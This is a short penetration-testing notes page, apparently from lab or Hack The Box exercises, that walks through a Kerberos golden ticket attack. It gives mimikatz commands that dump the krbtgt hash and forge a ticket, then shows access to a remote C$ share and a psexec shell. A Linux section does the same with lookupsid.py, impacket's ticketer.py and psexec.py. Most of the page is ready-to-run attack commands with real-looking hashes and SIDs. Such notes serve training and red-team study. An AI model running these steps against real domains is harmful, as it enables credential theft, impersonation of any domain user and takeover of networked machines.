# ðŸ¥‡ Golden Ticket Attacks

<figure><img src="../../../.gitbook/assets/Golden Ticket Attacks (1).png" alt=""><figcaption></figcaption></figure>

Here we have the hash for kerberos ticket granting ticket with which we can gernerate ktgt.

*   Run mimikatz and `privilege::debug`

    <figure><img src="../../../.gitbook/assets/Golden Ticket Attacks-1.png" alt=""><figcaption></figcaption></figure>
* `lsadump::lsa /inject /name:krbtgt` and copy these 2 into notepad for later use

<figure><img src="../../../.gitbook/assets/Golden Ticket Attacks-2.png" alt=""><figcaption></figcaption></figure>

{% code overflow="wrap" %}
```
kerberos::golden /User:Administrator /domain:marvel.local /sid:S-1-5-21-3537832060-1456167142-1983014419 /krbtgt:b72f4a5ed9bef0f6a0ec3d4b5a4e4320 /id:500 /ptt
```
{% endcode %}

* user can be anything
* rid is 500 for admin
* ptt means pass the ticket&#x20;

<figure><img src="../../../.gitbook/assets/Golden Ticket Attacks-3.png" alt=""><figcaption></figcaption></figure>

* We can access other computers on network `dir \\THEPUNISHER\c$`&#x20;

<figure><img src="../../../.gitbook/assets/Golden Ticket Attacks-4.png" alt=""><figcaption></figcaption></figure>

* `psexec.exe \\THEPUNISHER cmd.exe` to get a shell

## Linux

1. Since we have the krbtgt we can do a golden ticket attack: `krbtgt:819af826bb148e603acb0f33d17632f8`
2. We need domain-sid so using powersploit: _Powershell_:

```
Get-DomainSID -Domain htb.local
```

_Linux_:

```
lookupsid.py CORP/jen@192.168.203.74
```

Now using this info with impacket _ticketer_ to get the golden ticket:

```
ticketer.py -nthash 819af826bb148e603acb0f33d17632f8 -domain-sid S-1-5-21-3072663084-364016917-1341370565 -domain htb.local user
```

Putting the ticket in our environment variable:

```
export KRB5CCNAME=DoesNotExist.ccache
```

**Note:** before psexec check if dns and time is configured properly

```
psexec.py -debug htb.local/administrator@forest -k -no-pass
```
